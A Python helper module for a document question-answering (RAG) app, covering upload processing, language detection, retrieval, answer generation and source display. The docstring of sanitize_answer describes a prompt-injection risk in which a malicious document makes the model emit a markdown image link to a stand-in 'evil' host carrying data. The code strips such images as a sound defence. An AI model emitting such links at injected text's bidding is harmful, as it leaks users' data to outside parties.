"""
utils.py - helpers shared by app.py.

There is NO Streamlit code in this file on purpose: the whole RAG flow
(process a document, answer a question) can be tested without opening a browser.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

import config
from modules import llm
from modules.document_loader import load_document, save_uploaded_file
from modules.language_detector import detect_language
from modules.retriever import Retriever, index_chunks
from modules.text_processor import build_chunks
from modules.vector_store import VectorStore


@dataclass
class DocumentInfo:
    name: str
    language: str            # language used in chunk metadata (auto-detected or user-chosen)
    language_reliable: bool
    language_note: str
    pages: int | None        # None when the format has no pages (TXT/DOCX)
    chunks: int


# ---------------------------------------------------------------------------
# New document: extract -> detect language -> chunk -> embed -> index
# ---------------------------------------------------------------------------
def process_document(filename: str, data: bytes) -> tuple[VectorStore, DocumentInfo]:
    path = save_uploaded_file(filename, data)            # raises UnsupportedFormatError
    pages = load_document(path)                          # raises EmptyDocumentError / DocumentReadError
    text = "\n\n".join(p.text for p in pages)

    detection = detect_language(text)
    language = detection.language or "English"           # user can correct it in the UI
    reliable = detection.reliable and detection.language is not None

    chunks = build_chunks(pages, path.name, language)
    store = index_chunks(chunks)                         # a brand-new index replaces the old one
    store.save()                                         # also keep a copy in vectorstore/

    info = DocumentInfo(
        name=path.name,
        language=language,
        language_reliable=reliable,
        language_note=detection.note,
        pages=len(pages) if pages[0].page is not None else None,
        chunks=len(chunks),
    )
    return store, info


def relabel_language(store: VectorStore, info: DocumentInfo, language: str) -> None:
    """The user corrected the document language: update the metadata (no re-embedding needed)."""
    for chunk in store.chunks:
        chunk.metadata["language"] = language
    info.language = language
    info.language_reliable = True


# ---------------------------------------------------------------------------
# Question -> answer (one chat entry)
# ---------------------------------------------------------------------------
_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)|!\[[^\]]*\]\[[^\]]*\]")


def sanitize_answer(text: str) -> str:
    """Remove markdown images from LLM output.

    A malicious document could try to make the model emit ![x](http://evil/?data=...),
    which would make the browser send a request to that address. We never need images.
    """
    return _MD_IMAGE.sub("", text).strip()


def run_rag(
    store: VectorStore,
    question: str,
    language: str,
    mode: str,
    top_k: int,
    temperature: float,
) -> dict:
    """Retrieve context, generate the answer, return a chat-history entry."""
    retrieval = Retriever(store).retrieve(question, top_k=top_k)
    answer = llm.answer_question(retrieval, question, language, mode, temperature)
    return {
        "question": question,
        "answer": sanitize_answer(answer),
        "language": language,
        "mode": mode,
        "best_score": retrieval.best_score,
        "used_llm": retrieval.has_relevant_context,
        "sources": [
            {"rank": c.rank, "score": c.score, "text": c.text, "metadata": c.metadata}
            for c in retrieval.chunks
        ],
    }


# ---------------------------------------------------------------------------
# Display helpers
# ---------------------------------------------------------------------------
def flag_label(language: str) -> str:
    return f"{config.LANGUAGE_META[language]['flag']} {language}"


def describe_source(metadata: dict) -> str:
    parts = [str(metadata.get("source", "document"))]
    if metadata.get("page"):
        parts.append(f"page {metadata['page']}")
    parts.append(f"chunk {metadata.get('chunk_id')}")
    parts.append(str(metadata.get("language", "")))
    return " · ".join(p for p in parts if p)
